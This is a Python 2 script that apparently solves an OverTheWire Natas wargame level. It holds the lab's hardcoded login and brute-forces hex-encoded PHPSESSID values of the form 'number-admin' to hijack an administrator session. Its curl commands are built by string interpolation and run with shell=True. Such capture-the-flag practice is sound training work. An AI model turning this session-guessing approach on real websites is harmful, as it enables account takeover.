import subprocess, time, re, os


start = ''

asciichars = list(range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b))


credcombos = [
#     ('a', 'a'),
#     ('a', 'aa'),
#     ('a', 'aaa'),
#     ('aa', 'a'),
#     ('aa', 'aa'),
#     ('aa', 'aaa'),
#     ('aaa', 'a'),
#     ('aaa', 'aa'),
#     ('aaa', 'aaa'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'b'),
    ('a', 'bb'),
    ('a', 'bbb'),
    ('aa', 'b'),
    ('aa', 'bb'),
    ('aa', 'bbb'),
    ('aaa', 'b'),
    ('aaa', 'bb'),
    ('aaa', 'bbb')
]

def go(_u, _p):
    out = subprocess.check_output("""curl --basic -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org/index.php?debug=yes -F username=%s -F password=%s -X POST -v 2>&1 | grep Cookie """ % (_u, _p), shell=True)
    return re.match(r'.*PHPSESSID=([^;]+);.*', out).group(1)

for u, p in credcombos:
    m = go("a", "a")
    print "trying %r %r :: %r" % (u, p, m)
    decoded_cookie = "".join(chr(int(m[i:i+2], 16)) for i in range(0, len(m), 2))
    print "decoded => %r" % (decoded_cookie,)
    print "encoded again => %r" % "".join("%02x" % ord(c) for c in decoded_cookie) 
    break

# import sys
# sys.exit(1)

username = "natas20"
username = "admin"

for i in range(0, 640):
    cookie = "%d-%s" % (i, username)
    # cookie = "397-natas19"
    encoded_sess = "".join("%02x" % ord(c) for c in cookie) 
    # encoded_sess = "3339372d6e617461733139"
    # encoded_sess = "3435382d6e617461733230"
    print cookie, encoded_sess
    out = subprocess.call("""curl --basic -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org/index.php?debug=yes --cookie PHPSESSID=%s 2>/dev/null """ % (encoded_sess,), shell=True)

